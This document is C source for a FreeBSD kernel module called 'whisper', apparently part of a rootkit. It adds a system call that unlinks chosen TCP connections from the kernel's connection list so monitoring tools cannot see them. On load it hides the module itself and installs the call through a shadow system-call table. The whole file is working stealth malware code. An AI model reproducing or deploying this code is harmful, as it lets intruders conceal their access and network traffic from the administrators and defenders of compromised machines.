#include <sys/types.h>
#include <sys/param.h>
#include <sys/sysproto.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <net/vnet.h>
#include <sys/jail.h>
#include "kld_hiding.h"
#include "shadow_sysent.h"
#include "whisper.h"

#define KLD_NAME T_NAME"_whisper"
#define KLD_FILE_NAME T_NAME"_whisper.ko"

/* System call to hide an open TCP connection. */
static int whisper(struct thread *td, void *syscall_args) {

   struct whisper_args *uap;
   uap = (struct whisper_args *)syscall_args;
   struct inpcb *inpb;
#ifdef DEBUG
   bool found = false;
   uprintf("[-] uap->lport = %u uap->fport = %u\n", uap->lport, uap->fport);
#endif

   VNET_LIST_RLOCK_NOSLEEP();
   CURVNET_SET(TD_TO_VNET(td));
   struct inpcb_iterator inpi = INP_ALL_ITERATOR(&V_tcbinfo, INPLOOKUP_WLOCKPCB);

   /* Iterate through the TCP-based inpcb list. */
   while ((inpb = inp_next(&inpi)) != NULL) {

      // Do we want to hide this local open port that is
      // connected to this foreign port?
      if (((uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
            || (uap->lport == 0))
         && ((uap->fport == ntohs(inpb->inp_inc.inc_ie.ie_fport))
            || (uap->fport == 0))) {

         CK_LIST_REMOVE(inpb, inp_list);
#ifdef DEBUG
         found = true;
#endif
      }
   }

   CURVNET_RESTORE();
   VNET_LIST_RUNLOCK_NOSLEEP();

#ifdef DEBUG
   if (found) {
      uprintf("[-] Hiding connection between local port ( %u ) and "
         "foreign port ( %u )\n", uap->lport, uap->fport);
   }
#endif

   return (0);
}

/* The sysent for the new system call. */
static struct sysent whisper_sysent = {
   whisper,  // implementing function
   NULL,
   2,        // number of arguments
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif
   int error = 0;
   int syscall_num = offset;

   switch (cmd) {
   case MOD_LOAD:
      INSERT_SHADOW_ENTRY(WHISPER_INDEX, whisper, syscall_num);
#ifdef DEBUG
      uprintf("[-] whisper module loaded at sys call num %d\n", syscall_num);
#endif
      break;
   case MOD_UNLOAD:
      UNDO_SHADOW_ENTRY(WHISPER_INDEX);
#ifdef DEBUG
      uprintf("[-] whisper module unloaded from sys call num %d\n",
         syscall_num);
#endif
      break;
   default:
      error = EOPNOTSUPP;
      break;
   }

   return (error);
}

MODULE_VERSION(whisper, 1);
SYSCALL_MODULE(whisper, &offset, &whisper_sysent, load, NULL);
MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
